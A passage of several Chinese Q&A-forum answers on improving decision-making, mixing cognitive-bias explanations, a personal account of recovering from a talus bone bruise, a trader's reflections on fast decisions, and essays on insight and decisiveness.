的口味。他们可以选择拿现金或者等价的巧克力作为报酬。这些学生被分为两组，一组学生评价的巧克力有6款，另一组评价的有30款。结果发现，前者比后者更满意自己的选择，而且前者选择拿巧克力作为报酬的人是后者的4倍。 （信息超载带来的决策瘫痪）我们在选择的时候，如果花在选择的成本大于选择后带来的收益，我们往往会陷入决策瘫痪之中，也就是不知道如何更好的选择，从而选择“不选择”。同样的，在生活中，我们想要做出更好的选择，最好要让自己放弃掉一些选择，甚至只有一两个选择， 这样也不会因为选择过多导致决策成本太高，最后造成我们的不作为。比如，很多人做碎片化时间管理的时候，经常是一会看书，一会儿看知乎，一会儿看公众号。其实，想要更高效些，可以转化为一个选择——最好是选择知乎和我啦。5.逆反极化有的时候，我们知道哪个选择会让我们更好，但是我们为了让自己看起来更加“酷”，我们故意选择跟别人不一样的。父母们用QQ，那我就用微信好了；你们都认可，那我来当坏人吧，否则谁来衬托你们的好呢；英国脱欧，电视说很多人赞同是吧，那我就投反对票，然后就真的脱欧了。这也让我想起了很多电视桥段，看到两条分岔路，选择那条感觉更加刺激的，从而开始了自己的作死之路。在做出选择的时候，也要注意这点，尽可能减少他人选择对我们的影响，做出来的选择如果是深思熟虑后的，即是“从众”也不要太在意。6.平衡理论我们的认知是会自发追求心理平衡的，会喜欢我们偏好相关的事物，会讨厌我们厌恶有关的事物。最好的例子就是：智子疑邻和爱屋及乌。 （海德平衡理论图）心理学上的“登门槛效应”也是利用了我们对心理平衡的追求。登门槛效应，也就是我们会因为帮助过别人而更加倾向帮助别人，即是这个忙对我们有些难度。但是我们为了证明自己曾经帮忙是正确的，往往也会选择继续帮忙，否则前后不一致会带来很大的心理不平衡。在生活中，我们做出选择的时候也要注意这个心理盲区，不能一味追求心理平衡，而让自己更多的利益受到侵蚀。7.纯粹接触效应纯粹接触效应讲的是，我们会更喜欢我们经常看到的。比如，我们高中大学的时候，经常会在路上看到一两个异性，我们会不自觉的产生好感。这是因为熟悉带来的安全感，人们对熟悉的事物会更加喜欢。但是，我们对对方依然一无所知，如果因为多看效应就贸然去追求，得到的不一定是自己想要的。同样的，在专业和工作选择上也是如此。我们会因为我们高中选了理科，经常接触化学物理生物，从而觉得自己喜欢这些，但是到了大学之后，发现并不是特别喜欢想转专业之类。所以，在做出选择之前也要注意自己是否因为纯粹接触而喜欢对方，而没有考虑对方的内涵和更多实质。参考资料:《决策与判断》、《选择的悖论》、《社会心理学》、《影响力》—————————————当然，我们存在的心理盲区还有很多，能够避免上面的不足，已经可以做出一个较为优化的选择了。还有更多也欢迎评论区讨论。有收获就顺手点个赞吧，也当对个人几小时投入的一些鼓励，谢谢。自我提升：如何成为一个能独立思考的人？ - 卫蓝的回答如何对抗内心无处不在的疲惫感？ - 卫蓝的回答怎样更好的获取资源：怎样通过自己的努力进入到高级阶层？ - 卫蓝的回答 数个高票答案的决策理论让人叹为观止，作为绝对的外行人，我表示献上我的膝盖。我在知乎上也回答过一些问题，我的style是，不说理论。（针对这个问题我也说不出理论，水平太low。。。）我说一个自己的亲身经历好了，和大家分享一下所谓的“重大决策”到底意味着什么。2011年，当时我在厦大读研，我的右脚不慎在一场篮球赛上踩在了猪队友的脚上，我当时都能听到脚踝处“咔嚓”一声。。。同学们立马把我送到厦大兽医院（厦大医院。。。我们都这么叫它），花7块钱拍了个X光（话说也是真心便宜，不知道现在涨价了没），X光显示骨头一切正常，于是众人打道回府。但我一直觉得不对劲，首先，我的脚肿得太厉害了！脚踝足足粗了一倍还多，而且特别痛，那绝对不是普通扭伤的疼痛程度，我头两天晚上甚至睡不着觉。第四天，我的脚依旧钻心地疼痛，虽然X光显示骨头没问题，但我依旧心有忐忑，于是我再次来到厦大兽医院，找到了之前的那个医生。医生表示X光显示骨头没事，那就是没问题，让我不要担心，扭伤了以后疼痛是必然的。我的态度就一个，我要求开一个磁共振（MRI）的检查单，虽然兽医院做不了MRI，但厦大附属中山医院可以做，而兽医院开出的单据可以让作为厦大学生的我省掉一半以上的检查费（话说厦门做一个MRI要1050元，真心贵！）医生表示你完全没必要做MRI。我坚持。于是我得到了单据。到中山医院预约好MRI，四天后做出来的结果是：距骨挫伤！骨挫伤本身不是特别大的问题，毕竟骨头没断，但距骨挫伤绝对是比普通骨折要严重许多的问题。距骨是脚踝上的那个圆圆的骨头，说白了，人能运动靠的就是距骨这两个轴承。人身上两个骨头比较容易坏死，股骨头、以及距骨。（圆圆的那个“轴承”就是距骨，一旦受伤，这块骨头是人身上所有骨头中最难恢复的，没有之一！因为它的职责就是承重，即便恢复了，也要继续被“压迫”，因为很难痊愈，其一旦物理结构被破坏，以现在的医学条件来说100%痊愈很困难）百度了一圈后，我真的害怕了，我特么要是瘸了可咋办？！中山医院的某副主任让我先补打石膏，观察一个月再说，他表示距骨是容易坏死的骨头，你这个挫伤的性质目前不好判断，看看情况再说吧。事实证明我主动来做MRI是无比明智的，后来我查了国外的医学论文才知道，像我这种情况，美国的处理办法只要肿胀严重的二话不说石膏先打上，其他的后续再说。我错过了最佳的打石膏时间，但至少我补上了。。。回到宿舍，我开始疯狂Google以及百度，最终确定了几点：1、距骨挫伤基本属于运动伤病的范畴，而且比较麻烦，运气不好的话可能要动手术。2、手术不见得一定能好。。。而且如果几个月后发现软骨损伤严重的话，也许关节镜也解决不了问题，可能要开放性手术。。。开放性手术意味着先锯掉一段骨头，暴露视野，修复好目标位置，再接上骨头。。。听起来都吓人。。。3、一切取决于距骨软骨的预后情况4、搞不好会得关节炎，这个是最麻烦的。。。充分了解之后，我发现我这个毛病全国最有把握搞定的医院有两个：北医三院、以及上海华山医院，前者不用说了，几乎是国家运动员御用的疗伤圣地，后者是刘翔御用过的。我在好大夫上分别咨询了两个医院的一些专家，这些专家都挺nice，也都回复我了，北京专家的意见是：不好说，看情况观察下再说，是否需要手术要看恢复情况；上海的专家表示，你这个情况我接手过不少，大部分都需要手术。综合了多方信息后，作为一名烟酒僧，我干的第一件事儿是，首先在CNKI上把距骨挫伤有关的医学论文都down下来，然后利用google，把能找到的Talus Bruise相关医学论文都抓下来。老实说，我良好的英文功底在此时发挥了巨大作用。。。研究过这些论文后，结论是：国内的论文大都雷同，但对距骨挫伤的预后都不是很乐观，痊愈的希望不到40%；国外的论文相对靠谱一些，对距骨挫伤、尤其是软骨损伤的治疗方法都阐述的更详细，比如微骨折手术（micro-fracture)，话说麦迪就做过这个手术；以及自体培养软骨等等。各种资料综合后的结论让人迷茫：不负重（即伤腿不走路）越久，对骨头及软骨的愈合越有利，BUT，长时间不走路有可能骨质疏松，说白了，这脚就废了。。。另外，愈合期的少量负重，是能够刺激骨头及软骨尽愈合的。完全是各种矛盾、各种trade off好么。。。然后，没有任何医生能针对这个给出准确的时间表，医生都是根据经验，告诉你应该三个月左右慢慢负重。。。但这件事没那么简单，或早或晚负重一个月半个月，可能会决定一个人以后是健康人还是瘸子。。。我的决策能力这个时候体现出来了。决策步骤分为这么几步：1、根据国内外的医学论文，大致测算最佳的负重时间。研究完论文，我发现这些paper给出的时间是：2-5个月都可以。。。这么大的误差区间，真是给跪了。2、我加了两个距骨受伤的QQ群，里面有N个距骨受伤的家伙，凡是和我病情类似的家伙，我加他们好友，并详细询问他们的病史及负重时间，将这些人的信息都记录在excel表格中。根据“走访”记录，下地时间早于三个月的家伙们，预后都比较差！样本量勉强也差不多达到100了，具备了最最基本的统计学意义。于是我将自己的下地时间定在第四个月，在此期间，我给自己开了个“短波理疗”的药方，并且为了减轻肌肉萎缩，每天做各种按摩肌肉、对着空气踩单车之类的运动。在开始下地负重以后，根据“走访”结果，我将自己自己的负重阶段分为“初级负重”、“高级负重”、“完全负重”、“恢复运动”，四个阶段，期间我做过4次MRI，几乎天天逛国外的医学论坛并将自己的MRI片子传上去给某些医生看。。。直到一年半后，我才能重新跑步、打球，后遗症几乎完全没有，之所以说是几乎，是因为打过石膏的关系，右脚的翻转角度现在有一些小影响，但完全不影响运动。值得一提的是，我加入的两个QQ群里面，完全康复并恢复运动的，只有我自己。。。我这只脚踝真的几乎是我自己治好的，并非我不相信专家，而是当专家明显不靠谱的时候，你真的需要对自己的身体做出决策，这件事给我的最大经验是：决策一定要理性！收集现有的所有资料，这是“文献综述”的意义所在。。。我是不是该说我这个烟酒僧真的没白读呢。。。之后，要理性地收集sample，这些才是真正有指导意义的玩意。当真的需要决策的时候，保持清醒的头脑真的不那么容易，情绪很容易占据你的大脑，depression, upset，然后开始破罐子破摔。。。请保持理性！即便是在逆境中，保持理性起码能让你做出the least bad option（最不差的选择），如此，至少奇迹还是有可能发生的。————————————————————————————–2017-7-26 14:09:19 补充内容：真心没想到随手作答的一个答案，一天之内的点赞数就快飙到1k了，考虑到本答案的影响力在持续上升，我觉得有必要补充说明几点，免得给众人带来误导：1、虽然这份答案是关于“独立决策”的一份case，但事实上，我本人相当尊重各行各业的专业人士，尤其是医生。我在独立决策自己脚踝的恢复方案中，所参考的文献资料、咨询的专业对象，都是医学相关的，所以，最终促使我康复的，终究是专业知识。天朝碍于自身的国情，医疗服务很难面面俱到，就我个人而言，我对天朝的医疗服务还是基本满意的，如果有下辈子，我很想做一名医生。2、好多同学问我脚踝、以及膝盖的损伤问题，我在此给各位如下建议： a、首先，请X光排除重大的骨折等问题，当然，我相信大多数人这一步是做了的，毕竟再小的医院也是具备X光设备的。需要着重指出的一点是，在受伤的前期，请一定不要寻求中医的帮助，就我个人经验、以及“走访”获取的经验来看，受伤前期因为笃信中医所谓的推拿等技术而耽误病情的不在少数。中医在跌打损伤方面的确有自己的一套，比如云南白药，但那是药，不是医术，中医在受伤初期能做的事儿很小。如果你恰好有X光拍不出的病症、你又恰好还没做MRI检查，这个时候中医给你做任何的推拿只有一个作用：无限加重、以及拖延你的病情！所以，受伤的初期，最重要的是搞清楚，你的身体在物理方面是否遭受了器质性的损伤，这些需要影像学设备的帮忙，而非中医，因此，除了搞一瓶云南白药喷剂之外，请立即寻求西医的帮助。 b、如果你只是普通的崴脚之类，在X光排除骨折后，你在两周之内基本可以痊愈（如果你连X光也懒得拍，那我也只好说我懒得说了。。。）。而如果你在两周后，依旧存在肿胀不消退、负重行走疼痛、弯曲角度受限等等问题，请无论如何做一个MRI检查（磁共振）！切忌，这个钱不能省！ c、如果你已经有经常崴脚的毛病了，那么请放弃篮球、足球等活动吧。这说明你的韧带已经有问题了，运动员在初次韧带严重撕裂之后，一般会做手术做物理复位，这样才能保持良好的竞技水平。我们普通人很多时候的韧带轻微撕裂，我们自己都不知道，其实受伤的韧带已经异位愈合了，这意味着你的韧带的物理结构已经失去了最完美的状态（运动员做手术，就是为了避免这种情况，而用手术的办法人工纠正过来），已经不能支持你做距离的足球、篮球活动，继续激烈的对抗性运动很可能会让你受一次大伤，运气差的同学可能会得关节炎，不得不经常去注射玻璃酸钠之类的玩意，一个针头直接插进你的踝关节or膝关节里，你不害怕么。。。运气最差的，也许会变成瘸子。总之，没伤病的，请保护好自己的身体；有小毛病的，请远离对抗性活动。实在想打球的话，请玩“地板流”，绝对别搞AI，Kobe的打法，你会死的很惨的。。。 d、受伤之后，最最最最重要的一件事：充分卧床休息 + 如果肿胀的话脚垫高 + 不休息好绝对不下地负重，不遵守这个原则、不让自己这次的伤好利索的话，你会以后反复受伤，这很不值得！ e、运动受伤可大可小，99%的情况下，崴个脚是没事的，但我的确见过好多打篮球崴了脚导致以后别说跑步、走路都费劲的。。。NBA的医疗水平那么高，奥登的脚就挂了、姚明的脚也挂了。NBA的所有人的膝盖软骨都几乎是磨平的（无一例外），很多人职业生涯中后期都不得不考虑微骨折手术（micro-fracture），就是为了拯救膝盖软骨，但那么多人做了微骨折，很成功的也是少数（即便以NBA这么牛逼的医疗技术），同样是微骨折，贾森基德非常成功，麦蒂就差得多。我们不需要靠打球赚钱，所以至少请不要让自己的软骨搞的那么不像话，如果已经有症状，还持续运动，这不是勇敢，这叫无脑。。。 f、你越关心自己的骨头，你的骨头越给力，基本是这样的。3、我自己这个独立决策的案例，其实任何人都可以做到，就看你是否想花这个心思。好多人私信问我是干吗的，在这里统一作答：做过夜总会乐手、外贸、翻译、互联网产品经理。个人比较喜欢产品经理的这段经历。我想提醒大家的是，这种事儿没什么好值得崇拜的，你如果能够静下心来思考，你只会做的比我更好，然后，无论是谁，都需要运气的垂青，我也不例外。4、一些朋友问我如何学英语，well，如果你对英语学习有兴趣的话，可以看看这个 ：饱和英语学习法2.0 这是我写过的一个英语学习法的帖子。另外，我有个微信的订阅号，LarryTalksEnglish，如果你喜欢英语、以及对我扯淡有兴趣的话，可以关注下，没兴趣的请无视。5、我后来做产品经理数年，工作期间我的方法论及决策办法其实和这个距骨的事儿如出一辙： a、 “文献综述”（穷尽现有资料）； b、评估“文献综述”的实践意义 + 少量用户访谈，这一步是做基本的定性分析，以此确定后续定量分析的操作办法。 c、定量分析（大量问卷调查 or AB test or 产品点击量分析 or 产品后台用户数据分析） d、得出初步结论。 e、按照步骤d的结论，组内研讨之后，给出MVP产品形态（也有可能是UI图、调研成果等其他形式）； f、MVP注入目标用户人群，并跟踪使用情况。 g，反复a-f的步骤。 至此，我想我自己的决策机制，我已经讲清楚了。 如果你遇见事情的时候经常瞻前顾后，不知道如何下手，那么有可能并不是你的决策能力不行，而是自身的实力还有所欠缺。正如你在做一道历史考试里的选择题，给出你四个选项，问你辛亥革命是在哪一年发生的，如果你做不对，那么你要想的不是去提高决策能力，而是去补充自己的历史基础知识。而真正的决策能力则更多的是一个人在面对重大问题的时候，能够冷静果敢的做出判断，并且做出最优选择的能力。所以说，如果只是考虑早上吃油条豆浆还是煎饼果子，这不是决策，这只是纠结。而如果考虑公司一个重大的项目的时候，眼前只有AB两个选择，A选项会经历大风险，但是如果成功也会有大收获，B选项虽然平平稳稳，但盈利也只是尚可，这个时候能做出来的抉择，才能叫做决策能力。这也是我们第一个要明白的地方，好的决策能力，也是来源于好的归因能力，你要明确自己的不足，知道问题出在什么地方，然后才能找到相应合适的地方去弥补自己，这样才能进步。因此，我们可以把决策能力分成以下三个方面，但是在面对问题的时候，这三个方面并不是绝对孤立的，有可能也会协同发挥作用。一. 经验决策很多人会片面的将做出一种决策的能力，理解为一种魄力或者胆识。我们也许会常常佩服这种能够在风雨之中处变不惊的人，他们能够执航掌舵，在最危急的时刻，冒险做出抉择，那就是冲进最危险的海峡，生死一线间，最终穿越了暴风雨抵达平静的海面。我们在赞美他们的勇气和运气的同时，却忽略了这些人原本就是经验丰富，航行多年的老手，他们在勇气与运气之外，更多的是无数次生死考验留下的经验。同理，一个人要做出好的决策，首先就得有良好的知识及经验的储备，若非如此，只是靠着一时的运气做出决定，并不能带来更多的长远收益。比如说，我们经常能看见在互联网行业里出现着很多风口，按照雷军的说法，赶上了风口，猪也能飞上天，但事实上，如果你没有对这个行业深入，清晰的认识，没有大量调查学习得来的经验，即使风口就在你的眼前，你也飞不上天。因此，我们需要花足够的时间去了解行业，思考案例，在获取了大量的信息后，再在脑海里推演和分析，最终做出最好的决策。尤其是在互联网如今白热化的竞争趋势下，做决策的关键，就在于不断加深自己认知，深化自己的经验，因为我们要知道，所有的决策都是为未来的事情而做，但未来毕竟是没有事实根据，而基于过去和现在的信息数据是我们唯一能信得过的依据。因此，在我们做任何的重大决策之前，一定要在之前问自己几个问题，比如说，可以问一下自己，我在做出这个决策之前，是否不是来源于我经验的判断，而是受到了某种动机的驱使，这种动机是否会影响我做出决策的有效性？或者是我在看待这个问题时候，是否夹杂了自己的预设立场，这种立场会不会导致我的决策有失公允？以及我是否在做这个决策之前，和和我不同意见的人交换过想法，是否兼听则明？等等，通过这些问题，可以让我们决策更加准确，规避更多的风险。二. 理性决策从长远的角度来看，有两种决策。第一种是依靠经验来解决的突发性决策，第二种是靠着理性分析做出的长期性决策问题。比如说我们经常会遇到一些突发性况状，这个时候，靠着老道的经验，而不是冒险试运气，往往能做出相对来说更好的决策。但是，在面对长远选择的时候，经验分析也并不是十分靠谱，因为，经验主义会导致我们只从片面的个人经验出发，把局部经验当成普遍的状况，而导致在长远的决策上失败。但是，决策能力依然是可以通过学习和训练来提高，这里面有两点需要我们注意。第一，是养成一个决策者应该具备的素养。首先，就是要正视错误，做出决策，那么比然也会有决策失败的情况，所以，要敢于认识自己在前期决策时犯得错误，才能在后期决策的时候进行补救，不然，就会陷入一个不断发生错误的循环怪圈。其次要善于总结归纳过去决策成功的要点，成为一整套的判断经验，这样，才能够在思维中快速的形成决策。同时，为了让我们的决策不出现偏差，也要学习剔除那些主观的干扰因素，获取信息的渠道一定要真实客观。第二，就是要形成一种客观的决策框架，这一点，我们最好是通过学习博弈论的知识来补充自己。博弈论有一个非常著名的思想实验，叫做囚徒困境，它是在讲，两个囚犯被警察抓住，警察对他们说，你们每个人都有逃生的机会，不过这个决定权在你们自己的手里，警察会做出审讯，如果两人都抵赖，各判刑一年；如果两人都坦白，各判八年；如果两人中一个坦白而另一个抵赖，坦白的放出去，抵赖的判十年。结果最后，两个囚犯都选择坦白，各判了八年，谁也没有占到便宜，但是按照博弈论的思想，这个囚徒困境可以无限的进行下去，那么将这个囚徒试验一直进行下去，接近无限的次数的时候，囚徒之间就会越接近忠诚，因为他们在无数次的失败之后，彼此会得到一个最优化的解决方案，就是两个人都抵赖，各判刑一年。所以，将这种博弈论的思想运用在我们平时决策中，就是在考虑对方在你的行动之后，会做出什么反应，以此再来改正我们决策的方向，在进行多次推理之后，得到最优化的解决方案。这种决策方式，就类似于下围棋，有围棋经验的朋友们应该知道，下围棋就是做决策，考虑好之后的每一步该怎么走，最好的方法就是考虑到自己所走的任何一步对手做出的反应。再举一个例子，比如说你要向你喜欢的女孩子表白，但是你不知道使用哪一种表白方法会取得成功，最好的方法就是进行博弈论思考，预想你的每一种表白方法女孩子会有什么反应，不断调整自己的决策，得到稳妥的表白方案。三. 心理决策高质量的决策一定是取决于理性决策和经验决策的协同作用，但是也取决于当事人的心理状况，否则，哪怕再好的决策方案，交给一个胆小鬼也不会有所作为。有很多人，虽然他们已经具备了做出一个良好决策的条件，但是因为惧怕失败，导致在面对问题的时候，内心有恐惧心理，畏手畏脚，依然会导致决策的失败。所以，在决策之前，做好心理建设，也是重中之重。首先，就是要客服从众心理，不能人云亦云，他们往往会相信大众而多过于自己，这就会导致依赖性太强，哪怕自己做好了决策，也会因为别人的一句话而放弃，从而错失良机。其次，就是要建立一个强大的自信心基础，要相信自己的决策是对的，面对困难要有着迎难而上的勇气。最后，就是不要害怕失败，很多人之所以做不好决策，就是因为害怕承担决策失败的后果，或者对效果预期太高而不敢作为，所以，在做决策之前，一定要知道，如果想不出现挫折和失误，那只是作茧自缚，做决策，不一定是做出最完美的选择，而是要衡量得失利弊，做出最优化的选择，只有这样，决策能力才能够大幅度提高。正如我之前所说，理性决策，心理决策，经验决策，三者缺一不可，任何一个伟大的决策，都是它们同时在发挥作用。因此，在平时的时间提高自己的综合实力就非常重要，要多花时间在学习别人的长处和优点，以及各种干货知识上。只有这样，你的决策，才能够成为真正可以帮助到自己的力量。 提高决策能力这个问题我曾经认真研究过。因为我是一个交易员，而且随着水平的增长，盘前的交易计划在成功交易中占据的比例不断下降，我越来越依赖于盘中做出的正确反应。这当然首先需要非常多的成功经验，同时也有更多的失败经验，要尽量提高下一次决策的效用，两者都是非常重要的。在交易里面盘中决策的关键是速度，很多时候交易者的决策速度要快于价格变化的速度才行。我的经验是，很多时候，我大概要在十几秒左右做出一个决策。当然我不希望每天做出太多这类决策，如果频率达到一定程度，我知道自己肯定离开了最佳状态。在2013年我完全依赖于交易计划，在2014年可以偶然做出几次计划外的正确反应，在2016我大约一半成功交易来自于盘中的决策。交易中对决策速度的要求当然没有像在篮球比赛中做决策要求那么高，然而篮球比赛所能蕴含的情况相对交易而言变化也没有那么大，而且在篮球比赛中球员较容易从过去的错误中摆脱，这样决策与决策之间的关联性相对交易而言较低。而交易这样的事业上，由于不正确的决策方式，交易者很容易陷入连续决策错误的漩涡中无法脱身。交易就是对拥有资源做反复决策，决策-结算-重新开始，大致就是这样一个事业。交易者首先尽量应该让决策和决策之间的相关性尽量降低，因为坏的决策对后续决策之影响远高于好的决策。这一点和篮球这类事物不同。在篮球比赛中，最高水平的球员可以创造连续不投失的记录，而创造连续不投进记录的球员其决策机制就一定存在某些问题，低估了相关性的影响，主观的认为投篮和投篮之间是独立的，导致低水平的表现。然而，由于权重大致相同，这些差别也并未强烈的区分球员的收益水平。但在交易中，不能控制不利因素相关性的交易者很容易破产，相反则成为最大的赢家。除去让反复决策过程前后相对独立之外，我们还需要让决策机制强韧。这个意思是，即便决策失败（概率非常高），对交易者造成的不利影响也应该是非常有限的。但是如果当我们决策正确时收益不能远超过失败时的损失，交易就变成赌博一样的波动率高而隐含增长率低的活动。因此我们还需要考虑在决策机制上能够尽量扩大收益，但前提是限制决策失败时的损失。很大程度上正是损失过大造成了决策前后相关性太高，形成losing stream。绝不要高估依靠直觉即便包括知识做出决策成功的概率。据一本讲直觉决策的书称，即便是非常有经验的探员在审问嫌疑人时判断是否是谎言时正确的概率也只有65%。而缺乏经验的人更是显著低于这一数据。接下去就是训练自己对特定情况下决策的能力，这需要大量的成功-失败经验，依赖于当时你获取的信息，环境的反馈，以及你自身的状况。所以交易的生涯中从最开始就要记录关于这些的数据，当然由于交易生涯前后对某些参数的认知不同，一定会发生信息遗漏，过去的决策原因难以理解，决策环境难以重现等问题。所以最开始还是应该尽量写较为详细的日志。阅读名人传记的很大一个问题就是，名人做决策时的信息和自身状态是传记作者难以察觉的，因为双方存在认知差别，尤其是那些甚至没有特别花费精力研究名人思维方式的作者。写出的名人传记是毫无价值的，因为对于我们学习那些决策方式没有意义。作为交易者我们的工作其实和其他包括军事将领，企业家的工作并没有太大区别。这些人的传记都可以用来学习决策方式和好的习惯。当然要知道书籍不可避免的漏掉很多有意义的信息，所以决策理由只能猜测不能武断理解。交易者应该不断检查自己的想法和实际现实，审视之间的差别以及思考原因，这些习惯在很多名人传记中都可以发现。E.Rommel写很多文档，记录自己的思路，假设，收集到的信息等，而且对新的他认为重要的信息作出很快的反应，这和好的交易方式没有任何区别。所以甚至比起一些低价值的交易类书籍我认为像是《隆美尔战时文件》反而对交易员更好。另一个Rommel非常好的习惯是作战时总是身处前线到处收集第一手信息，这对于一个交易员同样是非常重要的，你对市场的反应速度就取决于这一点和你的习惯。你的行动要做到比价格还快才能成为最好的交易员中的一个。在feil knight的《shoes dog》里面我感受最多的是专注，如何做出一系列决策实际上缺乏很多细节，做为一个交易者当然需要全心专注于交易的过程甚至你的每一天。关于决策方法和习惯最佳的读物我还是最喜欢《隆美尔战时文件》，你完全可以将其看作是讲述交易决策的书籍。除了信息的内容是不同的。《George Soros:a unauthorized biography》也是一本非常用心的名人传记，但局外人毕竟不是本人，很多决策前因后果无法洞悉，对于我们学习如何决策也就帮助有限。但其行为特征依然具有价值。在一些访谈中基本无法接触到成功人士的决策过程，很多时候只有描述其行为特征的一两句话能够印证上面的思路。如果上述的习惯都建立起来，那么剩下的就是训练单次决策的能力，尽量的提升总效用，不论是从胜率出发还是从赔率，两者很可能是负相关这一点要清楚。当需要决策时，避免一切干扰，因为你的行动必须在很短的时间内完成，而且你必须有一个正确的行为习惯，否则成功的决策也可能没有效用。对于学习者而言，尽量详细的记录自己的决策过程是重要的，提高自己最有效的途径当然是研究自己的成功和失败，但是你必须在认知有长进之后重新回到当时的决策环境才能检查自己的理解，因此需要上面的习惯。这个过程，交易者应该更多专注于学习自身的过去，用你不断变化的认知回到过去，看待自己当时的决策问题，是单次决策效用提高最快的方法。 谢谢邀请。（不喜欢看长文的，看“__”） 我的回答方向和大家不一样。就分享一下“做决策的时候尽量避开什么”。说到“决策”，从生活方面而言，这样的过程叫作“选择”，从管理学的角度来讲，这个过程就叫“决策”。 通常，决策包括如下特性：1预见性。2选择性。3主观性。4可行性。5目标性。6满意性。 所以，我们先要搞清楚自己“想要的是什么”、“能要的是什么”。退一万步来说，至少得知道“自己不想要什么”，你更“信任什么”以及“为什么”。 就心理学而言：“决策”涉及个体的自我认知、情感（性格）、动机。决策能力是种综合能力。然，现在只扯：做决策时，最重要的两个能力：一：全方位的洞察力——知识只是信息而已，智慧却是洞察力。二：科学的决断力。——“思考能力”在这里不扯，思想无内容则空，直观无概念则盲。我从来都不认为“爱思考”的人很会“选”。“洞察”是直接地面对“问题”，直接地“看”。思考是围着“问题”绕来绕去，思考很多时候就是一种“猜测”。当你有了洞察力，你就不需要花时间不停地思考，你可以直接由那个洞察来“行动”（选择）。一：全方面的洞察力。 理论上来说，洞察力就是透过现象看本质；用弗洛伊德的话来讲，洞察力就是变无意识为有意识。那，是什么影响了你的洞察力？1获取信息片面。2乐观的偏见。（偏见和洞察力之间真的好微妙）3迷信权威。4迷信高大上的数据。（与3不同）5容易分心。6把自己的过去当成自己的向导。7患得患失，一方面因为成功而自鸣得意，另外一方面又因为失败而妄自菲薄。（与2不同）8不敢提出质疑。9错误的思维方式。10决策洞察力的养成是需要环境和时间的，需要一步一步的来，它需要以决策思维的多样性、决策信念的稳定性、决策技巧的丰富性及决策动机的准确性为基础。11洞察力最大的悲剧是什么？你的洞察力太过超前于自己时代的理解力。还是得活在人群中啊。12洞察力和敏感度来自于内在的清晰，而麻木迟钝则是内在混乱的产物。一定要知道自己内心真正想要的。13科学的洞察力表现在较快地透过现象抓住本质，迅速地找出表面上不同事物的共同原因或彼此间的联系。这离不开知识和实践的积累，更要求较高的观察综合力和判断力。没有渐变，不会有质变；没有数量，就谈不上质量。平日里多学习积累和实践，才可能有高水平的发现。二、科学的决断力。 法国哲学家布里丹写过一则寓言：一头小驴在干枯的草原上好不容易找到了两堆青草，由于不知道先吃哪一堆好，结果在长时间的选择和徘徊中饿死了。那，说到“决断力”，是什么影响了你的决断力？1为防止“布里丹效应”，首先，我们不可企求“万全之策”。如果说，合理选择就是决策最优化。我们不能一味追求“最好的选择”。2明智的决策，实质上就是对多种备选方案进行抉择；没有备用的B计划、C计划和D计划，自然影响决断力。3决策会受到多种因素的影响和制约。特别是环境。这个展开说一下。人是什么呢？我们不可能完完全全“独立”的活着，当我们跟任何人、事、物有所连结的时候，就已经跟他们和她们，还有它们，构成了一个系统。如果我们把所有身外物，都理解成一个系统，那影响我们命运的首先是“系统”里的“系统的排列”，其次才是你的“决策”。 这个世界，没有人是真正的单独的个体。你要知道“从来没有‘个人’这回事”，只有生活在各个不同系统中的“人”。 每个人的任何命运，都可以在系统层面找到成因，当然，所有的“解决之道”也在这些系统里。4我们决断一件事情的时候，永远存在着奇奇怪怪的不确定因素。唯一能抗衡的，大概就是“随心所欲不逾矩”。5“摸着石头过河”，是一种经验型决策方式，也是一把“双刃剑”。说到直觉，有些直觉不叫直觉，叫 educated guess。这种直觉其实不是guessing work, 也不是想象，它是基于现有数据样本的一个粗略的统计分析。有些直觉是个人体验和道听途说，要注意区分。 在用直觉思维的做决策的时候，我们要避免矫枉过正。把弯的东西扳正，又歪到了另一边，纠正错误超过了应有的限度。6说到“决断力”需要用到的预测能力，也是一把“双刃剑”，可以分享一句我今年以来我最喜欢的话——Alan Kay，个人计算机时代的大师，讲过一句话：”The best way to predict the future is to create it”(预测未来最好的办法，就是创造它)。7决断力，很多时候就是一种抉择博弈。在决策学上，美国学者奥立斯曾提出了著名的“奥立斯悖论”。这里，我只能说一句——“选择这个事情，要么就是一个大胆的探险，要么什么都不是。”8聪慧的人做决断。不依靠记忆。9我们做决断的时候，不但要培养穿透到事物深处的洞察力，还要有，能将自己看到的东西清晰地表达出来的能力。10记忆、计算和逻辑，这些，属于智商。洞察力、敏感度有助作出决断。所以，不要认为“敏感”是缺点。同时，不要有侥幸心理。成功的人之所以成功，靠得是判断实力和洞察力。失败的人之所以失败，是因为他们做事一开始就抱有侥幸的心理。那么，做决策，有没有什么套路？有没有最简易的决策套路？我的建议是：1把决策理解为解决问题的初级阶段，2把解决问题理解为决策的从属过程。发现问题，分析问题，解决问题。这是一个很复杂的工程，不敢放开写。解决问题不外乎，你必须具备：1必要的知识（所以要多阅读，多积累）；2不怕失误、不怕犯错误的态度；3专心致志和、马上行动、和，深邃的洞察力。至于简单粗暴的方式？一是“两利相衡取其重”，二是“两害相权从其轻”，简单吧。 最后，冒进多悔型决策人考虑问题欠周全，寡悔少进型决策人考虑问题太狭隘，缺乏决策风险的决心，勇进善谋型决策人能够处理好决策的风险性、信仰性和无悔性三者之间的关系，但，决策的时候多多少少有些武断，生而为人，不容易。 这题没有简单的解法。建议就事论事，钻研实际的事情，买房就研究地产市场，小孩上学就多和别的家长聊聊，不要在“决策能力”这种玄学上浪费时间。决策，有专门的研究，叫决策科学。普通人如何通过训练提高自己的电动力学水平？普通人如何通过训练提高自己的计量经济学水平？说不清吧。那普通人怎么提高决策水平，这么容易就说清了？粗略分一分，科学决策有几个步骤：定义问题，制定目标，制定备选的行动方案，制定评价标准，获得信息，解读信息作出推断，行动（决策），持续观察并评估决策的效果。举个例子，问题是“我想家了”，目标是“明天回家”，备选方案是“坐飞机，坐火车，坐汽车”，评价标准是“哪个便宜坐哪个”，获得信息是“上网查票价”，解读信息是“火车票最便宜”，行动是“就买火车票吧”，后评估是“第二天晚上一检查，发现自己已经在家了，目标实现”。后来美国政治学家Linbolm写了一篇论文，叫《摸着石头过河的艺术》（The Science of Muddling 